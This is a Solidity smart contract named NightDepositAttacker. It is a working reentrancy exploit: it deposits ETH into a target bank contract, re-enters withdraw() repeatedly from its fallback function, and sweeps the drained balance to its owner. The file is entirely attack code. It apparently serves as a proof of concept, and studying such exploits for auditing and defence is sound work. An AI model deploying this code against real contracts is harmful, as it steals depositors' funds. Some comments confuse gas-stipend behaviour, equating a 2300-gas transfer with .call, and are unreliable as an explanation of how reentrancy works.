// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IBank {
    function deposit() external payable;
    function withdraw() external;
    function balances(address) external view returns (uint256);
}

contract NightDepositAttacker {
    IBank public bank;
    address public owner;
    uint256 public hits;
    uint256 constant MAX_HITS = 20;

    constructor(address _bank) {
        bank = IBank(_bank);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.sender == owner, "not owner");
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    // ETH transfer leg uses a 2300-gas stipend (.call{value:...}(""))-equivalent -> must stay empty.
    receive() external payable {}

    // Token.mint() hook calls back here with an unmatched 4-byte selector (0x410593e3),
    // routed via a normal CALL with full forwarded gas -> real reentrancy point.
    fallback() external payable {
        hits++;
        if (hits < MAX_HITS) {
            try bank.withdraw() {} catch {}
        }
    }

    function sweep() external {
        require(msg.sender == owner, "not owner");
        payable(owner).transfer(address(this).balance);
    }
}
